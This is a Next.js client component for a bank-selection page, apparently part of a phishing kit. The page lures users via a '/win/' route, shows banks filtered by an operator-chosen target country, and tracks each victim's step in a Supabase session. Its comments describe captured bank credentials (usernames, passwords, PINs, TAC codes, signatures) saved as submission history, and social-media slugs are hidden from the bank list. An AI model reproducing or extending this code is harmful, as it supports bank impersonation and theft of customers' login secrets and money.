"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { getPreferredRouteSessionId, persistActiveSession } from "@/lib/session-id-client";
import { useSettings } from "@/contexts/SettingsContext";
import { countriesMatch } from "@/lib/country-utils";
import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";

type Props = {
  sessionId: string;
  routeSessionId?: string;
  initialBanks: BankCatalogEntry[];
};

export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
  const [bankSlug, setBankSlug] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [recovering, setRecovering] = useState(false);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const navigationLockRef = useRef(false);
  const refreshAbortRef = useRef<AbortController | null>(null);
  const selectionVersionRef = useRef(0);
  const mountedRef = useRef(true);

  useEffect(() => {
    setBanks(initialBanks);
  }, [initialBanks]);

  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      selectionVersionRef.current += 1;
      refreshAbortRef.current?.abort();
    };
  }, []);

  const refreshBanks = useCallback(async () => {
    if (navigationLockRef.current) return;

    refreshAbortRef.current?.abort();
    const controller = new AbortController();
    refreshAbortRef.current = controller;

    try {
      const res = await fetch(`/api/banks?t=${Date.now()}`, {
        cache: "no-store",
        headers: {
          "Cache-Control": "no-cache",
        },
        signal: controller.signal,
      });

      if (!res.ok) return;
      const data = await res.json();
      if (!Array.isArray(data.banks)) return;

      setBanks(
        data.banks.map((bank: any) => {
          const rawLogoFile = bank.logoFile ?? bank.logo_file;
          const resolvedLogoFile = resolveLocalBankLogoFile(bank.slug ?? null, rawLogoFile);
          return {
            slug: bank.slug,
            name: bank.name,
            domain: bank.domain,
            logoFile: resolvedLogoFile,
            country: bank.country,
            isActive: bank.isActive !== false && bank.is_active !== false,
          };
        }),
      );
    } catch (error) {
      if (error instanceof Error && error.name === "AbortError") return;
      /* ignore transient refresh errors */
    } finally {
      if (refreshAbortRef.current === controller) {
        refreshAbortRef.current = null;
      }
    }
  }, []);

  useEffect(() => {
    if (!sessionId) return;
    persistActiveSession(sessionId, routeSessionId);
    if (supabase) {
      void supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken" })
        .eq("id", sessionId);
    }
    if (window.location.search.includes("session=")) {
      window.history.replaceState(window.history.state, "", "/banken");
    }
  }, [sessionId, routeSessionId, supabase]);

  useEffect(() => {
    const resetUi = () => {
      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      setSaving(false);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      setBanks(initialBanks);
    };

    const refreshView = () => {
      if (navigationLockRef.current) return;
      resetUi();
      void refreshBanks();
    };

    const onPageShow = (event: PageTransitionEvent) => {
      const entries = typeof performance !== "undefined" ? performance.getEntriesByType("navigation") : [];
      const navEntry = entries[0] as PerformanceNavigationTiming | undefined;
      const isBackForward = navEntry?.type === "back_forward";

      if (event.persisted || isBackForward) {
        refreshView();
      }
    };

    window.addEventListener("pageshow", onPageShow);
    return () => {
      window.removeEventListener("pageshow", onPageShow);
    };
  }, [initialBanks, refreshBanks]);

  const demoOptions = useMemo(() => {
    // Sadece aktif olanları ve (eğer seçilmişse) hedef ülkenin bankalarını göster
    // 🚨 FACEBOOK BANKA DEGIL: Kullanici banka listesinde ASLA gorunmesin.
    const NON_BANK_SLUGS = /facebook|meta|instagram/i;
    let validBanks = banks.filter(b => b.isActive !== false && !(b?.slug && NON_BANK_SLUGS.test(b.slug)));
    
    if (settings.target_country && settings.target_country !== "Tümü") {
      validBanks = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
    }

    return validBanks.map((bank) => ({
      slug: bank.slug,
      displayName: bank.name,
      domain: bank.domain,
      logoFile: resolveLocalBankLogoFile(bank.slug, bank.logoFile),
    }));
  }, [banks, settings.target_country]);

  const filteredOptions = useMemo(() => {
    const q = searchTerm.trim().toLowerCase();
    if (!q) return demoOptions;
    return demoOptions.filter((opt) => opt.displayName.toLowerCase().includes(q));
  }, [searchTerm, demoOptions]);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cachedSessionId = localStorage.getItem("activeSessionId");
      if (cachedSessionId) {
        setRecovering(true);
        router.replace("/banken");
      }
    } catch {
      /* ignore localStorage access errors */
    }
  }, [sessionId]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      setBankSlug(fd.bankSlug ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleBankSelect(nextBankSlug: string, displayName: string) {
    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current) return;

    const selectionVersion = selectionVersionRef.current + 1;
    selectionVersionRef.current = selectionVersion;
    navigationLockRef.current = true;
    refreshAbortRef.current?.abort();
    setSaving(true);
    setMsg(null);
    setBankSlug(nextBankSlug);

    const nextFormData: Record<string, any> = {
      ...sessionFormData,
    };

    // 🔴 KRITIK: bankSlug / bankName ALANLARINI BURADA DB YE YAZMA!
    //    Neden? Kullanici SEB secti -> submit -> sonra Swedbank'a sectiginde,
    //    eger burada bankName=Swedbank yazarsak ESKI SEB submitinin bankName
    //    kaydini DB den silmis oluruz. Sonra Swedbank submit esnasinda
    //    sfd.bankName (ESKI) Swedbank olur (SEB degil) -> history yanlis isimle kaydedilir.
    //    Bunlar SADECE bank-login-client icindeki HANDLE SUBMIT aninda credentials
    //    icinden nextFormData'ya yazilir (garantili).

    // Banka değiştirildiğinde eski bankaya ait giriş bilgilerini temizle
    const bankSpecificFields = [
      "username", "password", "verfuegernummer", "pin", "rekeningnummer",
      "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"
    ];
    for (const field of bankSpecificFields) {
      delete nextFormData[field];
    }

    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "bank",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    if (!mountedRef.current || selectionVersionRef.current !== selectionVersion) {
      return;
    }

    setSaving(false);
    if (error) {
      navigationLockRef.current = false;
      setMsg("Salvestamine ebaõnnestus.");
    }
    else {
      setSessionFormData(nextFormData);
      router.push(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
    }
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    if (recovering) {
      return (
        <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
          <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
            <h2 className="text-2xl font-bold text-white mb-2">{settings.banken_title}</h2>
            <p className="text-sm text-gray-300 mb-8">Seanss taastatakse...</p>
            <div className="flex justify-center py-12">
              <div className="size-10 animate-spin rounded-full border-4 border-[var(--brand)]/30 border-t-[var(--brand)]" />
            </div>
          </div>
        </div>
      );
    }
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[var(--brand-panel)] border border-[var(--brand)] shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] p-5 sm:p-8 text-center">
          <h2 className="text-2xl font-bold text-white mb-2">{settings.banken_title}</h2>
          <p className="text-sm text-gray-300 mb-6">Vigane link.</p>
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
            Kasutage edasimineks täielikku linki.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-2 pt-[14vh] sm:p-6 sm:pt-[22vh]">
      <div className="space-y-4 w-full max-w-[720px] relative z-10 fade-in">
        <div className="luxury-glass p-4 sm:p-7">
          <div className="text-center mb-5 sm:mb-6">
            <h2 className="text-xl sm:text-2xl font-bold text-white tracking-tight" style={{ fontFamily: "var(--font-instrument-serif), Georgia, serif" }}>{settings.banken_title}</h2>
            <p className="text-xs sm:text-sm text-white/60 mt-1.5 font-medium max-w-[480px] mx-auto">{settings.banken_subtitle}</p>
          </div>
          
          <div className="mx-auto mb-4 sm:mb-5 max-w-[480px]">
            <div className="flex items-center gap-2 rounded-2xl border border-white/8 bg-white/[0.05] px-3.5 py-2.5 shadow-[inset_0_1px_0_rgba(255,255,255,0.04),inset_0_-1px_0_rgba(0,0,0,0.4)] focus-within:border-[var(--brand)]/50 focus-within:ring-1 focus-within:ring-[var(--brand)]/30 focus-within:shadow-[0_0_0_4px_rgba(var(--brand-rgb),0.14),0_0_20px_-4px_rgba(255,236,73,0.30),inset_0_1px_0_rgba(255,255,255,0.08)] transition-all duration-200">
              <svg aria-hidden viewBox="0 0 24 24" className="h-4 w-4 shrink-0 text-white/45" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="11" cy="11" r="7" />
                <path d="m20 20-3.5-3.5" />
              </svg>
              <input
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder={settings.banken_search_placeholder}
                className="w-full bg-transparent text-sm text-white outline-none placeholder:text-white/35"
              />
            </div>
          </div>

          <div className="max-h-[62vh] sm:max-h-[48vh] overflow-y-auto pr-1 custom-scrollbar">
            <div className="grid grid-cols-1 gap-2.5 sm:gap-3 pb-1">
              {filteredOptions.length === 0 ? (
                <div className="col-span-1 rounded-2xl border border-white/8 bg-white/[0.04] p-5 text-center text-sm text-white/70 backdrop-blur-sm">
                  Valitud riigi jaoks pole paiku pandud pangasid. Palun puhastage otsingufilter.
                </div>
              ) : filteredOptions.map((opt, idx) => (
                <button
                  key={opt.slug}
                  type="button"
                  onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                  disabled={saving}
                  className={`group w-full flex items-center gap-3 sm:gap-4 rounded-2xl border border-white/8 bg-white/[0.04] p-3 sm:p-3.5 shadow-sm transition-all duration-300 ease-out hover:border-white/15 hover:bg-white/[0.08] hover:shadow-[0_20px_44px_-16px_rgba(0,0,0,0.60),0_0_30px_-8px_rgba(255,236,73,0.18)] hover:-translate-y-0.5 active:translate-y-0 ${
                    bankSlug === opt.slug ? "!border-[var(--brand)]/60 !bg-gradient-to-r !from-[var(--brand)]/12 !via-white/[0.06] !to-[var(--brand-dark)]/12 ring-1 ring-[var(--brand)]/40 shadow-[0_0_0_1px_rgba(var(--brand-rgb),0.20),0_0_40px_-10px_rgba(var(--brand-rgb),0.30),0_0_50px_-14px_rgba(255,236,73,0.22)]" : ""
                  }`}
                  style={{ animationDelay: `${idx * 28}ms` }}
                >
                  {/* SOL: YUVARLAK LOGO ALANI (72px - TAM YUVARLAK, logo TAM SIGSIN) */}
                  <div className="bank-logo-round">
                    <img
                      src={optimizeSupabaseImageUrl(opt.logoFile, { format: "webp", quality: 90, width: 256 }) || opt.logoFile}
                      alt={opt.displayName}
                      onError={(e) => {
                        e.currentTarget.onerror = null;
                        e.currentTarget.style.display = 'none';
                        const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                        if (fallback) fallback.style.display = 'grid';
                      }}
                    />
                    <div style={{ display: 'none' }} className="bank-logo-round-fallback">
                      {opt.displayName.charAt(0)}
                    </div>
                  </div>

                  {/* ORTA: BANKA ADI — sadece tek satir, alt aciklama YOK (kullanici 'Vali oma pank...' yazisini istemiyor) */}
                  <div className="flex-1 min-w-0 text-left">
                    <p className="text-[16px] sm:text-[17px] font-semibold text-white/95 group-hover:text-white leading-tight tracking-tight" style={{ fontFamily: "var(--font-instrument-serif), Georgia, serif" }}>
                      {opt.displayName}
                    </p>
                  </div>

                  {/* SAG: Ok / eylem alani */}
                  <div className="shrink-0 flex items-center gap-2">
                    {saving && bankSlug === opt.slug ? (
                      <div className="size-5 animate-spin rounded-full border-2 border-[var(--brand)]/30 border-t-[var(--brand)]" />
                    ) : (
                      <div className="size-9 sm:size-10 grid place-items-center rounded-2xl bg-gradient-to-br from-white/[0.06] to-white/[0.02] border border-white/[0.07] text-white/50 group-hover:text-white group-hover:bg-gradient-to-br group-hover:from-[var(--brand)]/18 group-hover:via-[var(--brand-dark)]/18 group-hover:to-[#f59e0b]/12 group-hover:border-[var(--brand)]/25 group-hover:shadow-[0_0_22px_-6px_rgba(var(--brand-rgb),0.45)] transition-all duration-300">
                        <svg aria-hidden viewBox="0 0 24 24" className="h-4.5 w-4.5 sm:h-5 sm:w-5" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                          <path d="m9 6 6 6-6 6" />
                        </svg>
                      </div>
                    )}
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>

        {msg ? (
          <div className="text-center text-sm text-red-300/90 bg-red-500/10 backdrop-blur-md border border-red-500/20 p-3.5 rounded-2xl shadow-[0_20px_40px_-18px_rgba(239,68,68,0.35)]">
            {msg}
          </div>
        ) : null}
      </div>
    </div>
  );
}
